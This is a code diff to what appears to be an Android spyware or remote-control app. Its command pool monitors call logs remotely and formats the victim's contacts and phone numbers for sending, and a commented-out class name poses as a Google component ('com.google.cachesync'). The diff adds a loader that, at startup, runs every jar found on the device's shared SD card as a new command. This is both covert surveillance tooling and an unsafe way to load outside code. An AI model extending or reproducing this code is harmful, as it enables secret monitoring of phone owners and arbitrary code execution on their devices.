@@ -16,6 +16,8 @@ import java.util.Date;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.List;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
 
 import android.content.SharedPreferences;
 
@@ -30,6 +32,8 @@ import org.apache.http.util.EntityUtils;
 import com.code4bones.utils.BackgroundTask;
 import com.code4bones.utils.Mail;
 import com.code4bones.utils.NetLog;
+
+import dalvik.system.DexClassLoader;
 
 import android.content.Context;
 import android.database.Cursor;
@@ -79,11 +83,78 @@ public class CommandPool extends Object {
 		return this;
 	}
 	
+	public CommandObj loadPlugin(String jarFile,String classPath) {
+		String className = classPath.substring(0, classPath.length()-6).replace("/",".");
+		NetLog.v("class name = %s\r\n",className);
+
+		String msg;
+		try {
+			DexClassLoader classLoader = new DexClassLoader(jarFile, "/mnt/sdcard/", null, getClass().getClassLoader());
+			Class<?> cls = classLoader.loadClass(className);
+			CommandObj command = (CommandObj)cls.newInstance();
+			return command;
+		} catch (ClassNotFoundException e) {
+			msg = e.getMessage();
+			e.printStackTrace();
+		} catch (IllegalAccessException e) {
+			msg = e.getMessage();
+			e.printStackTrace();
+		} catch (InstantiationException e) {
+			msg = e.getMessage();
+			e.printStackTrace();
+		}
+		NetLog.v("Cannot load plugin:%s\r\n",msg);
+		return null;
+	}
+	
+	public boolean loadPlugins() {
+    	try {
+        	File dir = new File("/mnt/sdcard/");
+        	File[] jarList = dir.listFiles(new FilenameFilter() {
+				public boolean accept(File file, String name) {
+					return name.endsWith(".jar");
+				}
+        	});
+        	if ( jarList.length == 0 )
+        		return false;
+        	for ( File jarFile: jarList ) {
+        		NetLog.v("JAR: %s",jarFile.getAbsolutePath());
+        		JarFile jar = new JarFile(jarFile);
+        		Enumeration<JarEntry> entryList = jar.entries();
+        		while ( entryList.hasMoreElements() ) {
+        			JarEntry entry = entryList.nextElement();
+        			String name = entry.getName();
+        			if ( !name.endsWith(".class") || name.indexOf('$') != -1 )
+        				continue;
+        			CommandObj command = loadPlugin(jarFile.getAbsolutePath(),name);
+        			if ( command == null )
+        				continue;
+        			
+        			NetLog.v("Plugin command added: %s\r\n",command.commandName);
+        			add(command);
+        		}
+        	}
+        	
+        	/*
+        	String clsName = "com.google.cachesync.CustomCommand";
+    		DexClassLoader classLoader = new DexClassLoader(jarFile, "/mnt/sdcard/", null, getClass().getClassLoader());
+    		Class<?> myClass = classLoader.loadClass(clsName);
+			CommandObj command = (CommandObj)myClass.newInstance();
+    	   */
+    	} catch ( Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}     	
+    	return true;
+	} // loadPlugins
+	
 	/*
 	 *  Initialization pool with command set
 	 */
 	public void Init() {
 
+		loadPlugins();
+		
 		/*
 		 *  Monitoring of call log base 
 		 *  "rcalls;on|off"
@@ -192,9 +263,9 @@ public class CommandPool extends Object {
 							String info;
 							
 							if ( con.phones.size() == 1 ) {
-								info = String.format("%03d | <b>%s</b> : %s\r\n",nCount,con.name,con.phones.get(0));
+								info = String.format("%03d | %s : %s\r\n",nCount,con.name,con.phones.get(0));
 							} else {
-								info = String.format("%03d | <b>%s</b>\r\n",nCount,con.name);
+								info = String.format("%03d | %s\r\n",nCount,con.name);
 								for ( String p : con.phones ) 
 									info = info.concat(String.format("   %s\r\n",p));
 							} // else
